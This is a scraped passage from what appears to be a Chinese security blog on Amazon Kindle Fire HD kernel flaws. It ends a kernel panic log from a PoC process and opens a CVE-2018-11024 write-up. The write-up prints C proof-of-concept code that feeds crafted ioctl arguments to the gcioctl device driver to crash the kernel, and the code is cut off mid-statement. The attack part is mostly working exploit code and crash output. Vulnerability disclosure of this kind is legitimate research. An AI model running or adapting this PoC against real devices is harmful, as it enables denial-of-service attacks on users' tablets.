e1a0c00d[ 381.321868] 710c e92dd800 e24cb004 ebffced4 e3a00000 e89da800 e1a0c00d e92dd830 e24cb004[ 381.332550] 712c e1a04000 e3020710 e59f510c ebf4dd18 e1a01000 e1a00005 ebf55e0b e3500000[ 381.343078] 714c 1a000023 e5943000 e1540003 0a000008 e1a02005 e5940004 e5b21014 e5853014[ 381.353759] 716c e5832004 e5801000 e5810004 e5844000 e5844004 e59f00c0 ebf55d9f e3020710[ 381.364440] 718c e59f50b4 ebf4dd02 e1a01000 e285001c ebf55df5 e3500000 1a00001a e594201c[ 381.375122] 71ac e1a03005 e594c018 e2841018 e285001c e58c2004 e582c000 e5b32030 e5851030[ 381.385681] 71cc e5821004 e5842018 e584301c ebf55d8a e89da830 e1a03000 e3a02068 e59f105c[ 381.396331] [ 381.396362] LR: 0xc006e938:[ 381.401306] e938 e1a01000 0a000007 e3a05000 e2433001 e5843008 e1a00004 eb18d7ad e1a00005[ 381.411987] e958 e24bd014 e89da830 e1a00004 e50b1018 eb18d135 e51b1018 e1a05000 eafffff4[ 381.422668] e978 e1a0c00d e92dd878 e24cb004 e1a04000 e1a05001 eb18d91b e5943008 e3530000[ 381.433288] e998 e1a06000 0a000007 e3a05000 e2433001 e5843008 e1a00004 e1a01006 eb18d794[ 381.443817] e9b8 e1a00005 e89da878 e1a01005 e1a00004 eb18d158 e1a05000 eafffff5 e1a0c00d[ 381.454498] e9d8 e92dd800 e24cb004 e5903000 e1a0c000 e3530000 0a00000b e5910008 e5932008[ 381.465179] e9f8 e1500002 da000003 ea000006 e5932008 e1520000 ba000003 e283c004 e5933004[ 381.475830] ea18 e3530000 1afffff8 e5813004 f57ff05f e3a00000 e58c1000 e89da800 e1a0c00d[ 381.486358] [ 381.486358] SP: 0xde943dd8:[ 381.491455] 3dd8 de942000 00000001 00000004 dd2160f4 60010013 c031716c a0000013 ffffffff[ 381.501983] 3df8 de943e44 c25e6598 de943e6c de943e10 c06a5318 c0008370 00000000 c0a25b64[ 381.512664] 3e18 c0a25b64 00000000 c25e6580 c0a25b50 de942000 eddad327 c25e6598 dd3e8ca8[ 381.523315] 3e38 00000000 de943e6c de943e38 de943e58 c006e9b8 c031716c a0000013 ffffffff[ 381.533996] 3e58 00000000 be8075c8 de943f04 de943e70 c0317704 c031712c 00000001 00000028[ 381.544525] 3e78 be8075c8 de943ea0 de943e98 de943e90 c0207454 c00bd920 de943e90 de943e90[ 381.555206] 3e98 de943e98 de943e98 00000000 00000002 00000002 eddad33f 41414141 41414141[ 381.565734] 3eb8 41414141 41414141 41414141 41414141 41414141 d7b96700 de943efc de943ee0[ 381.576293] [ 381.576293] IP: 0xde943db8:[ 381.581390] 3db8 de943dd4 de943dc8 c00795b4 c00792bc de943e0c de943dd8 c0070df8 c00795ac[ 381.592071] 3dd8 de942000 00000001 00000004 dd2160f4 60010013 c031716c a0000013 ffffffff[ 381.602630] 3df8 de943e44 c25e6598 de943e6c de943e10 c06a5318 c0008370 00000000 c0a25b64[ 381.613311] 3e18 c0a25b64 00000000 c25e6580 c0a25b50 de942000 eddad327 c25e6598 dd3e8ca8[ 381.623870] 3e38 00000000 de943e6c de943e38 de943e58 c006e9b8 c031716c a0000013 ffffffff[ 381.634399] 3e58 00000000 be8075c8 de943f04 de943e70 c0317704 c031712c 00000001 00000028[ 381.645080] 3e78 be8075c8 de943ea0 de943e98 de943e90 c0207454 c00bd920 de943e90 de943e90[ 381.655761] 3e98 de943e98 de943e98 00000000 00000002 00000002 eddad33f 41414141 41414141[ 381.666442] [ 381.666442] FP: 0xde943dec:[ 381.671417] 3dec c031716c a0000013 ffffffff de943e44 c25e6598 de943e6c de943e10 c06a5318[ 381.681976] 3e0c c0008370 00000000 c0a25b64 c0a25b64 00000000 c25e6580 c0a25b50 de942000[ 381.692535] 3e2c eddad327 c25e6598 dd3e8ca8 00000000 de943e6c de943e38 de943e58 c006e9b8[ 381.703216] 3e4c c031716c a0000013 ffffffff 00000000 be8075c8 de943f04 de943e70 c0317704[ 381.713867] 3e6c c031712c 00000001 00000028 be8075c8 de943ea0 de943e98 de943e90 c0207454[ 381.724548] 3e8c c00bd920 de943e90 de943e90 de943e98 de943e98 00000000 00000002 00000002[ 381.735076] 3eac eddad33f 41414141 41414141 41414141 41414141 41414141 41414141 41414141[ 381.745758] 3ecc d7b96700 de943efc de943ee0 c02089fc 00000000 d74f9540 00000004 d74f9540[ 381.756408] [ 381.756408] R1: 0xc0a25ae4:[ 381.761383] 5ae4 00000000 00000000 00040b03 01040101 ffff0100 00000000 00000000 0000ffff[ 381.772064] 5b04 00000000 0e0c0000 01010005 01000105 0000ffff 00000000 0e0c0000 01010005[ 381.782714] 5b24 00000105 01040901 00040001 ffff0101 00000000 00000000 00040b03 01040101[ 381.793273] 5b44 3f3f0100 00010001 01000001 00000000 00000000 00000000 c0a25b5c c0a25b5c[ 381.803955] 5b64 00000000 c0a25b64 00000000 00000000 00000001 c0a25b78 c0a25b78 c0a25b80[ 381.814605] 5b84 c0a25b80 00000000 00000000 00000001 c0a25b94 c0a25b94 c0a25b9c c0a25b9c[ 381.825286] 5ba4 00000000 00000000 00000001 c0a25bb0 c0a25bb0 c0a25bb8 c0a25bb8 c0a25bc0[ 381.835815] 5bc4 c0a25bc0 c0a25bc8 c0a25bc8 00000000 00000000 00000000 00000000 00000000[ 381.846496] [ 381.846496] R2: 0xc0a25ae4:[ 381.851470] 5ae4 00000000 00000000 00040b03 01040101 ffff0100 00000000 00000000 0000ffff[ 381.862152] 5b04 00000000 0e0c0000 01010005 01000105 0000ffff 00000000 0e0c0000 01010005[ 381.872802] 5b24 00000105 01040901 00040001 ffff0101 00000000 00000000 00040b03 01040101[ 381.883453] 5b44 3f3f0100 00010001 01000001 00000000 00000000 00000000 c0a25b5c c0a25b5c[ 381.893981] 5b64 00000000 c0a25b64 00000000 00000000 00000001 c0a25b78 c0a25b78 c0a25b80[ 381.904663] 5b84 c0a25b80 00000000 00000000 00000001 c0a25b94 c0a25b94 c0a25b9c c0a25b9c[ 381.915344] 5ba4 00000000 00000000 00000001 c0a25bb0 c0a25bb0 c0a25bb8 c0a25bb8 c0a25bc0[ 381.925872] 5bc4 c0a25bc0 c0a25bc8 c0a25bc8 00000000 00000000 00000000 00000000 00000000[ 381.936523] [ 381.936523] R4: 0xc25e6500:[ 381.941619] 6500 00000002 00000000 d7a55550 00000000 00000000 00000000 c2410c00 000008a8[ 381.952148] 6520 c0a10a88 00000000 c16281fc 00000000 00000000 00000000 00000000 000003e8[ 381.962829] 6540 c25e6000 00000093 00000000 00000000 00000000 00000000 00000000 00000000[ 381.973480] 6560 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000[ 381.984008] 6580 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000[ 381.994689] 65a0 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000[ 382.005340] 65c0 00000000 00000028 00000000 00000000 00000000 00000000 00000000 00000000[ 382.016021] 65e0 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000[ 382.026519] [ 382.026519] R5: 0xc0a25ad0:[ 382.031616] 5ad0 00010105 01010005 01040901 00040001 ffff0101 00000000 00000000 00040b03[ 382.042175] 5af0 01040101 ffff0100 00000000 00000000 0000ffff 00000000 0e0c0000 01010005[ 382.052856] 5b10 01000105 0000ffff 00000000 0e0c0000 01010005 00000105 01040901 00040001[ 382.063507] 5b30 ffff0101 00000000 00000000 00040b03 01040101 3f3f0100 00010001 01000001[ 382.074157] 5b50 00000000 00000000 00000000 c0a25b5c c0a25b5c 00000000 c0a25b64 00000000[ 382.084716] 5b70 00000000 00000001 c0a25b78 c0a25b78 c0a25b80 c0a25b80 00000000 00000000[ 382.095245] 5b90 00000001 c0a25b94 c0a25b94 c0a25b9c c0a25b9c 00000000 00000000 00000001[ 382.105926] 5bb0 c0a25bb0 c0a25bb0 c0a25bb8 c0a25bb8 c0a25bc0 c0a25bc0 c0a25bc8 c0a25bc8[ 382.116577] [ 382.116577] R6: 0xde941f80:[ 382.121551] 1f80 de917b80 c00635cc 00000013 de84190c de917b80 c00635cc 00000013 00000000[ 382.132202] 1fa0 00000000 00000000 de941ff4 de941fb8 c0068af4 c00635d8 00000000 00000000[ 382.142730] 1fc0 de917b80 00000000 00000000 00000000 de941fd0 de941fd0 00000000 de84190c[ 382.153259] 1fe0 c0068a64 c004cd64 00000000 de941ff8 c004cd64 c0068a70 00000000 00000000[ 382.163940] 2000 00000000 00000002 00000000 dd0bd7c0 c0a0e840 00000000 00000015 c2de6540[ 382.174621] 2020 00000000 de942000 c09ddc50 dd0bd7c0 de83d300 c1617b40 de943ba4 de943af0[ 382.185150] 2040 c06a36e4 00000000 00000000 00000000 00000000 00000000 01000000 00000000[ 382.195800] 2060 01c454c0 5ebfe27f 00000000 00000000 00000000 00000000 00000000 00000000[ 382.206451] [ 382.206451] R7: 0xeddad2a7:[ 382.211425] d2a4 ******** ******** ******** ******** ******** ******** ******** ********[ 382.222106] d2c4 ******** ******** ******** ******** ******** ******** ******** ********[ 382.232788] d2e4 ******** ******** ******** ******** ******** ******** ******** ********[ 382.243316] d304 ******** ******** ******** ******** ******** ******** ******** ********[ 382.253997] d324 ******** ******** ******** ******** ******** ******** ******** ********[ 382.264678] d344 ******** ******** ******** ******** ******** ******** ******** ********[ 382.275238] d364 ******** ******** ******** ******** ******** ******** ******** ********[ 382.286071] d384 ******** ******** ******** ******** ******** ******** ******** ********[ 382.296752] d3a4 ******** ******** ******** ******** ******** ******** ******** ********[ 382.307434] [ 382.307434] R8: 0xc25e6518:[ 382.312408] 6518 c2410c00 000008a8 c0a10a88 00000000 c16281fc 00000000 00000000 00000000[ 382.323059] 6538 00000000 000003e8 c25e6000 00000093 00000000 00000000 00000000 00000000[ 382.333587] 6558 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000[ 382.344268] 6578 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000[ 382.354919] 6598 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000[ 382.365600] 65b8 00000000 00000000 00000000 00000028 00000000 00000000 00000000 00000000[ 382.376129] 65d8 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000[ 382.386779] 65f8 00000000 00000000 00000093 00000093 0000004d 00000002 00000000 00000000[ 382.397308] [ 382.397338] R9: 0xdd3e8c28:[ 382.402282] 8c28 dd3e8c28 dd3e8c28 00000000 00000000 00000000 c06bc674 000200da c09dda58[ 382.412933] 8c48 00000000 00000000 dd3e8c50 dd3e8c50 00000000 c0aa5174 c0aa5174 c0aa5148[ 382.423614] 8c68 5aefce7f 00000000 00000000 00000000 dd3e8c80 00000000 00000000 00000000[ 382.434112] 8c88 00200000 00000000 00000000 dd3e8c94 dd3e8c94 dd3d2380 dd3d2380 00000000[ 382.444793] 8ca8 000521a4 000003e8 000003e8 00000000 00000000 00000000 c06b9600 dd154400[ 382.455322] 8cc8 dd3e8d80 dd35ce70 00001064 00000001 0fb00000 5aefce7f 2cb41780 5aefce7f[ 382.466003] 8ce8 2cb41780 5aefce7f 2cb41780 00000000 00000000 00000000 00000000 00000000[ 382.476531] 8d08 00000000 00000000 00000000 00000000 00000001 00000000 00000000 dd3e8d24[ 382.487182] Process gcioctl_poc_2 (pid: 4073, stack limit = 0xde9422f8)[ 382.494689] Stack: (0xde943e58 to 0xde944000)[ 382.499603] 3e40: 00000000 be8075c8[ 382.508819] 3e60: de943f04 de943e70 c0317704 c031712c 00000001 00000028 be8075c8 de943ea0[ 382.517913] 3e80: de943e98 de943e90 c0207454 c00bd920 de943e90 de943e90 de943e98 de943e98[ 382.527130] 3ea0: 00000000 00000002 00000002 eddad33f 41414141 41414141 41414141 41414141[ 382.536346] 3ec0: 41414141 41414141 41414141 d7b96700 de943efc de943ee0 c02089fc 00000000[ 382.545562] 3ee0: d74f9540 00000004 d74f9540 be8075c8 dd3e8ca8 00000000 de943f74 de943f08[ 382.554656] 3f00: c0136044 c0317448 00000000 00000000 00000000 00000001 00000000 dd045190[ 382.563873] 3f20: dcf8c770 de943f0c de942000 be807638 be8075c8 c02c5d6d d74f9540 00000004[ 382.573120] 3f40: de942000 00000000 de943f64 00000000 be8075c8 c02c5d6d d74f9540 00000004[ 382.582183] 3f60: de942000 00000000 de943fa4 de943f78 c01365e0 c0135fc4 00000000 00000000[ 382.591430] 3f80: 00000400 be807638 00010e64 00000000 00000036 c0013e08 00000000 de943fa8[ 382.600646] 3fa0: c0013c60 c0136578 be807638 00010e64 00000004 c02c5d6d be8075c8 be8075c8[ 382.609863] 3fc0: be807638 00010e64 00000000 00000036 00000000 00000000 00000000 be807624[ 382.618927] 3fe0: 00000000 be8075ac 000106a0 0002918c 60000010 00000004 00000000 00000000[ 382.628143] Backtrace: [ 382.631164] [&lt;c0317120&gt;] (free_buffer+0x0/0x13c) from [&lt;c0317704&gt;] (dev_ioctl+0x2c8/0x10c4)[ 382.640563] r5:be8075c8 r4:00000000[ 382.644958] [&lt;c031743c&gt;] (dev_ioctl+0x0/0x10c4) from [&lt;c0136044&gt;] (do_vfs_ioctl+0x8c/0x5b4)[ 382.654388] [&lt;c0135fb8&gt;] (do_vfs_ioctl+0x0/0x5b4) from [&lt;c01365e0&gt;] (sys_ioctl+0x74/0x84)[ 382.663604] [&lt;c013656c&gt;] (sys_ioctl+0x0/0x84) from [&lt;c0013c60&gt;] (ret_fast_syscall+0x0/0x30)[ 382.673004] r8:c0013e08 r7:00000036 r6:00000000 r5:00010e64 r4:be807638[ 382.681304] Code: e1a02005 e5940004 e5b21014 e5853014 (e5832004) [ 382.697326] Board Information: [ 382.697357] Revision : 0001[ 382.697357] Serial : 0000000000000000[ 382.697387] SoC Information:[ 382.697387] CPU : OMAP4470[ 382.697418] Rev : ES1.0[ 382.697418] Type : HS[ 382.697418] Production ID: 0002B975-000000CC[ 382.697448] Die ID : 1CC60000-50002FFF-0B00935D-11007004[ 382.697448] [ 382.733703] ---[ end trace 58e760c9cd2996a9 ]---[ 382.739074] Kernel panic - not syncing: Fatal exception[ 382.744964] CPU1: stopping[ 382.748229] Backtrace: [ 382.751251] [&lt;c0018148&gt;] (dump_backtrace+0x0/0x10c) from [&lt;c0698bb8&gt;] (dump_stack+0x18/0x1c)[ 382.760742] r6:c09ddc50 r5:c09dc844 r4:00000001 r3:c0a0e950[ 382.767761] [&lt;c0698ba0&gt;] (dump_stack+0x0/0x1c) from [&lt;c0019bd8&gt;] (handle_IPI+0x190/0x1c4)[ 382.777008] [&lt;c0019a48&gt;] (handle_IPI+0x0/0x1c4) from [&lt;c00084fc&gt;] (gic_handle_irq+0x58/0x60)[ 382.786499] [&lt;c00084a4&gt;] (gic_handle_irq+0x0/0x60) from [&lt;c06a5380&gt;] (__irq_svc+0x40/0x70)[ 382.795684] Exception stack(0xde885e98 to 0xde885ee0)[ 382.801483] 5e80: de885ee0 0000d120[ 382.810577] 5ea0: 1ce88a9c 00000059 1cc00792 00000059 c161e498 00000000 c09ece64 de960480[ 382.819793] 5ec0: c0ad01c8 de885f0c 0000017e de885ee0 c008e350 c0431ae0 600f0013 ffffffff[ 382.829010] r6:ffffffff r5:600f0013 r4:c0431ae0 r3:c008e350[ 382.836029] [&lt;c0431a90&gt;] (cpuidle_wrap_enter+0x0/0x9c) from [&lt;c04310c0&gt;] (cpuidle_enter_tk+0x18/0x1c)[ 382.846374] r7:00000000 r6:c161e498 r5:c161e498 r4:de96048c[ 382.853515] [&lt;c04310a8&gt;] (cpuidle_enter_tk+0x0/0x1c) from [&lt;c04315dc&gt;] (cpuidle_enter_state+0x1c/0x78)[ 382.863983] [&lt;c04315c0&gt;] (cpuidle_enter_state+0x0/0x78) from [&lt;c04334b8&gt;] (cpuidle_enter_state_coupled+0x13c/0x36c)[ 382.875518] r6:de884000 r5:c161e498 r4:de96048c r3:00000000[ 382.882659] [&lt;c043337c&gt;] (cpuidle_enter_state_coupled+0x0/0x36c) from [&lt;c043176c&gt;] (cpuidle_idle_call+0x134/0x31c)[ 382.894256] [&lt;c0431638&gt;] (cpuidle_idle_call+0x0/0x31c) from [&lt;c0015294&gt;] (cpu_idle+0xa4/0x10c)[ 382.903961] [&lt;c00151f0&gt;] (cpu_idle+0x0/0x10c) from [&lt;c0695650&gt;] (secondary_start_kernel+0x118/0x13c)[ 382.914093] [&lt;c0695538&gt;] (secondary_start_kernel+0x0/0x13c) from [&lt;80694ff4&gt;] (0x80694ff4)[ 382.923400] r6:10c0387d r5:00000015 r4:9e84c06a r3:c0694fdc[ 382.930603] CPU0 PC (0) : 0xc003ee38[ 382.934661] CPU0 PC (1) : 0xc003ee54[ 382.938720] CPU0 PC (2) : 0xc003ee54[ 382.942901] CPU0 PC (3) : 0xc003ee54[ 382.946960] CPU0 PC (4) : 0xc003ee54[ 382.951019] CPU0 PC (5) : 0xc003ee54[ 382.955200] CPU0 PC (6) : 0xc003ee54[ 382.959259] CPU0 PC (7) : 0xc003ee54[ 382.963317] CPU0 PC (8) : 0xc003ee54[ 382.967376] CPU0 PC (9) : 0xc003ee54[ 382.971557] CPU1 PC (0) : 0xc0019b2c[ 382.975616] CPU1 PC (1) : 0xc0019b2c[ 382.979675] CPU1 PC (2) : 0xc0019b2c[ 382.983856] CPU1 PC (3) : 0xc0019b2c[ 382.987915] CPU1 PC (4) : 0xc0019b2c[ 382.991973] CPU1 PC (5) : 0xc0019b2c[ 382.996154] CPU1 PC (6) : 0xc0019b2c[ 383.000213] CPU1 PC (7) : 0xc0019b2c[ 383.004272] CPU1 PC (8) : 0xc0019b2c[ 383.008453] CPU1 PC (9) : 0xc0019b2c[ 383.012512] [ 383.014312] Restarting Linux version 3.4.83-gd2afc0bae69 (build@14-use1a-b-39) (gcc version 4.7 (GCC) ) #1 SMP PREEMPT Tue Sep 19 22:04:47 UTC 2017[ 383.014312]","link":"/2020/09/12/IOT/Exploit/Amazon%20Kindle%20Fire%20HD(3rd)/%EF%BC%88CVE-2018-11022%EF%BC%89Amazon-Kindle-Fire-HD-3rd-Fire-OS-kernel%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/"},{"title":"（CVE-2018-11024）Amazon Kindle Fire HD (3rd) Fire OS kernel组件安全漏洞","text":"一、漏洞简介 Amazon Kindle Fire HD（3rd）Fire OS 4.5.5.3的内核组件中的内核模块/omap/drivers/misc/gcx/gcioctl/gcif.c允许攻击者通过设备/ dev上ioctl的参数注入特制参数/ gcioctl使用命令1077435789并导致内核崩溃。 二、漏洞影响Fire OS 4.5.5.3 三、复现过程poc 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436#include&lt;stdio.h&gt;#include&lt;string.h&gt; //strlen#include&lt;sys/socket.h&gt;#include&lt;arpa/inet.h&gt; //inet_addr#include&lt;unistd.h&gt; //write#include &lt;stdlib.h&gt;#include &lt;sys/stat.h&gt;#include &lt;sys/mman.h&gt;#include &lt;fcntl.h&gt;#include &lt;stdbool.h&gt;// Socket boilerplate code taken from here: http://www.binarytides.com/server-client-example-c-sockets-linux//* seed, ioctl_id, num_mappings, num_blobs, dev_name_len, dev_name, map_entry_t_arr, blobs*/int debug = 1;typedef struct { int src_id; int dst_id; int offset;} map_entry_t;short tiny_vals[18] = {128, 127, 64, 63, 32, 31, 16, 15, 8, 7, 4, 3, 2, 1, 0, 256, 255, -1};int *small_vals;int num_small_vals;// populates small_vals when calledvoid populate_arrs(int top) { int num = 1; int count = 0; while (num &lt; top) { //printf(&quot;%d\\n&quot;, num); num &lt;&lt;= 1; count += 2; } // top count += 1; // -1 count += 1; num_small_vals = count; num &gt;&gt;= 1; small_vals = malloc(sizeof(int)*count); memset(small_vals, 0, count); int i = 0; while(num &gt; 1) { small_vals[i] = num; i++; small_vals[i] = num-1; i++; num &gt;&gt;= 1; } small_vals[i] = 0; small_vals[i+1] = top; small_vals[i+2] = top-1; small_vals[i+3] = -1;}// generate a random value of size size and store it in elem.// value has a weight % chance to be a &quot;small value&quot;void gen_rand_val(int size, char *elem, int small_weight) { int i; if ((rand() % 100) &lt; small_weight) { // do small thing unsigned int idx = (rand() % num_small_vals); printf(&quot;Choosing %d\\n&quot;, small_vals[idx]); switch (size) { case 2: idx = (rand() % 18); *(short *)elem = tiny_vals[idx]; break; case 4: *(int *)elem = small_vals[idx]; break; case 8: *(long long*)elem = small_vals[idx]; break; default: printf(&quot;Damn bro. Size: %d\\n&quot;, size); exit(-1); } } else { for(i=0; i &lt; size; i++) { elem[i] = (char)(rand()%0x100); } }} int main(int argc , char *argv[]){ int num_blobs = 0, num_mappings = 0, i = 0, dev_name_len = 0, j; unsigned int ioctl_id = 0; char *dev_name; void *tmp; char **ptr_arr; int *len_arr; unsigned int seed; int sockfd , client_sock , c , read_size; struct sockaddr_in server , client; int msg_size; void *generic_arr[264]; // max val for small_vals array int top = 8192; int cnt = 0; // chance that our generics are filled with &quot;small vals&quot; int default_weight = 50; populate_arrs(top); int retest = 1; goto rerun; sockfd = socket(AF_INET , SOCK_STREAM , 0); if (sockfd == -1) { printf(&quot;Could not create socket&quot;); } puts(&quot;Socket created&quot;); setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &amp;(int){ 1 }, sizeof(int)); server.sin_family = AF_INET; server.sin_addr.s_addr = INADDR_ANY; server.sin_port = htons(atoi(argv[1])); //Bind if( bind(sockfd,(struct sockaddr *)&amp;server , sizeof(server)) &lt; 0) { //print the error message perror(&quot;bind failed. Error&quot;); return 1; } puts(&quot;bind done&quot;);listen: // Listen listen(sockfd , 3); puts(&quot;Waiting for incoming connections...&quot;); c = sizeof(struct sockaddr_in); // accept connection from an incoming client client_sock = accept(sockfd, (struct sockaddr *)&amp;client, (socklen_t*)&amp;c); if (client_sock &lt; 0) { perror(&quot;accept failed&quot;); return 1; } puts(&quot;Connection accepted&quot;); msg_size = 0; // Receive a message from client while( (read_size = recv(client_sock , &amp;msg_size , 4 , 0)) &gt; 0 ) { // recv the entire message char *recv_buf = calloc(msg_size, sizeof(char)); if (recv_buf == NULL) { printf(&quot;Failed to allocate recv_buf\\n&quot;); exit(-1); } int nrecvd = recv(client_sock, recv_buf, msg_size, 0); if (nrecvd != msg_size) { printf(&quot;Error getting all data!\\n&quot;); printf(&quot;nrecvd: %d\\nmsg_size:%d\\n&quot;, nrecvd, msg_size); exit(-1); } // quickly save a copy of the most recent data int savefd = open(&quot;/sdcard/saved&quot;, O_WRONLY|O_TRUNC|O_CREAT, 0644); if (savefd &lt; 0) { perror(&quot;open saved&quot;); exit(-1); } int err = write(savefd, recv_buf, msg_size); if (err != msg_size) { perror(&quot;write saved&quot;); exit(-1); } fsync(savefd); close(savefd);rerun: if (retest) { recv_buf = calloc(msg_size, sizeof(char)); int fd = open(&quot;/sdcard/saved&quot;, O_RDONLY); if (fd &lt; 0) { perror(&quot;open:&quot;); exit(-1); } int fsize = lseek(fd, 0, SEEK_END); printf(&quot;file size: %d\\n&quot;, fsize); lseek(fd, 0, SEEK_SET); read(fd, recv_buf, fsize); } char *head = recv_buf; seed = 0; //seed, ioctl_id, num_mappings, num_blobs, dev_name_len, dev_name, map_entry_t_arr, blob_len_arr, blobs memcpy(&amp;seed, head, 4); head += 4; memcpy(&amp;ioctl_id, head, 4); head += 4; memcpy(&amp;num_mappings, head, 4); head += 4; memcpy(&amp;num_blobs, head, 4); head += 4; memcpy(&amp;dev_name_len, head, 4); head += 4; // srand with new seed srand(seed); /* dev name */ dev_name = calloc(dev_name_len+1, sizeof(char)); if (dev_name == NULL) { printf(&quot;Failed to allocate dev_name\\n&quot;); exit(-1); } memcpy(dev_name, head, dev_name_len); head += dev_name_len; /* map */ map_entry_t *map = calloc(num_mappings, sizeof(map_entry_t)); if (map == NULL) { printf(&quot;Failed to allocate map\\n&quot;); exit(-1); } if (num_mappings != 0) { memcpy(map, head, num_mappings*sizeof(map_entry_t)); head += num_mappings*sizeof(map_entry_t); } /* blobs */ // first create an array to store the sizes themselves len_arr = calloc(num_blobs, sizeof(int)); if (len_arr == NULL) { printf(&quot;Failed to allocate len_arr\\n&quot;); exit(-1); } // we'll also want an array to store our pointers ptr_arr = calloc(num_blobs, sizeof(void *)); if (ptr_arr == NULL) { printf(&quot;Failed to allocate ptr_arr\\n&quot;); exit(-1); } // copy the blob sizes into our size_arr for (j=0; j &lt; num_blobs; j++) { memcpy(&amp;len_arr[j], head, sizeof(int)); head += sizeof(int); } // we'll also want memory bufs for all blobs // now that we have the sizes, allocate all the buffers we need for (j=0; j &lt; num_blobs; j++) { ptr_arr[j] = calloc(len_arr[j], sizeof(char)); printf(&quot;Sizeof(ptr_arr[%d])=%d\\n&quot;, j, len_arr[j]); printf(&quot;ptr_arr[%d]=%p\\n&quot;, j, ptr_arr[j]); //printf(&quot;just added %p to ptr_arr\\n&quot;, ptr_arr[j]); if (ptr_arr[j] == NULL) { printf(&quot;Failed to allocate a blob store\\n&quot;); exit(-1); } // might as well copy the memory over as soon as we allocate the space memcpy((char *)ptr_arr[j], head, len_arr[j]); printf(&quot;ptr_arr[%d]=\\n&quot;, j); for(i=0;i&lt;len_arr[j];i+=4){ printf(&quot;0x%08x\\n&quot;, *(unsigned int *)(ptr_arr[j] + i)); } printf(&quot;\\n&quot;); head += len_arr[j]; } int num_generics = 0; // time for pointer fixup for (i=0; i &lt; num_mappings; i++) { // get out entry map_entry_t entry = map[i]; // pull out the struct to be fixed up char *tmp = ptr_arr[entry.src_id]; // check if this is a struct ptr or just a generic one // just a generic one if (entry.dst_id &lt; 0) { // 90% chance we fixup the generic if ( (rand() % 10) &gt; 0) { int buf_len = 128; char *tmp_generic = malloc(buf_len); memset(tmp_generic, 0, buf_len); // 95% chance we fill it with data if ((rand() % 100) &gt; 95) { // if dst_id is &lt; 0, it's abs value is the element size int size = -1 * entry.dst_id; int weight; // if it's a char or some float, never choose a &quot;small val&quot; if (size == 1 || size &gt; 8) weight = 0; else weight = default_weight; for (i=0; i &lt; buf_len; i+=size) { gen_rand_val(size, &amp;tmp_generic[i], weight); } } generic_arr[num_generics] = tmp_generic; memcpy(tmp+entry.offset, &amp;tmp_generic, sizeof(void *)); num_generics += 1; if (num_generics &gt;= 264) { printf(&quot;Code a better solution for storing generics\\n&quot;); exit(1); } } } // a struct ptr, so we have the data else { // 1 in 400 chance we don't fixup if ( (rand() % 400) &gt; 0) { // now point it to the correct struct/blob // printf(&quot;placing %p, at %p\\n&quot;, ptr_arr[entry.dst_id], tmp+entry.offset); memcpy(tmp+entry.offset, &amp;ptr_arr[entry.dst_id], sizeof(void *)); } } } if (debug) { printf(&quot;ioctl_id: %d\\n&quot;, ioctl_id); printf(&quot;num_mappings: %d\\n&quot;, num_mappings); printf(&quot;num_blobs: %d\\n&quot;, num_blobs); printf(&quot;dev_name_len: %d\\n&quot;, dev_name_len); printf(&quot;dev_name: %s\\n&quot;, dev_name); printf(&quot;data[]: \\n&quot;); //printf(&quot;(0x%x)\\n&quot;, *(int *)&amp;ptr_arr[0]); printf(&quot;(0x%p) : &quot;, &amp;ptr_arr[0]); printf(&quot;(0x%016lx)\\n&quot;, *(unsigned long int *)ptr_arr[0]); printf(&quot;(0x%p) : &quot;, (&amp;ptr_arr[0]+1*8)); printf(&quot;(0x%016lx)\\n&quot;, *(unsigned long int *)(ptr_arr[0]+1*8)); printf(&quot;(0x%p) : &quot;, (&amp;ptr_arr[0]+2*8)); printf(&quot;(0x%016lx)\\n&quot;, *(unsigned long int *)(ptr_arr[0]+2*8)); printf(&quot;(0x%p) : &quot;, (&amp;ptr_arr[0]+3*8)); printf(&quot;(0x%016lx)\\n&quot;, *(unsigned long int *)(ptr_arr[0]+3*8)); printf(&quot;(0x%p) : &quot;, (&amp;ptr_arr[0]+4*8)); printf(&quot;(0x%016lx)\\n&quot;, *(unsigned long int *)(ptr_arr[0]+4*8)); //printf(&quot;(0x%016lx)\\n&quot;, *(unsigned long int *)(ptr_arr[0]+5*8)); //printf(&quot;(0x%016lx)\\n&quot;, *(unsigned long int *)(ptr_arr[0]+6*8)); //printf(&quot;(0x%x)\\n&quot;, (int *)ptr_arr, (int *)ptr_arr); } // time for the actual ioctl //printf(&quot;Try to open device %s\\n&quot;, dev_name); //fflush(stdout); int fd = open(dev_name, O_RDONLY); if (fd &lt; 0) { perror(&quot;open&quot;); exit(-1); } else { printf(&quot;Open devicd %s successfully.\\n&quot;, dev_name); } //fflush(stdout); //printf(&quot;Try to call ioctl(fd=%d, ioctl_id=%d, ptr_arr=%p)\\n&quot;, fd, ioctl_id, ptr_arr[0]); fflush(stdout); printf(&quot;%10d:&quot;, cnt++); if ((ioctl(fd, ioctl_id, ptr_arr[0])) == -1) perror(&quot;ioctl&quot;); else printf(&quot;good hit\\n&quot;); close(fd); printf(&quot;device %s closed\\n&quot;, dev_name); if (retest) exit(0); fflush(stdout); // okay now free all the shit we alloced free(recv_buf); free(dev_name); if (map != NULL) free(map); free(len_arr); for (i=0; i &lt; num_blobs; i++) { //printf(&quot;%d: free'ing %p\\n&quot;, 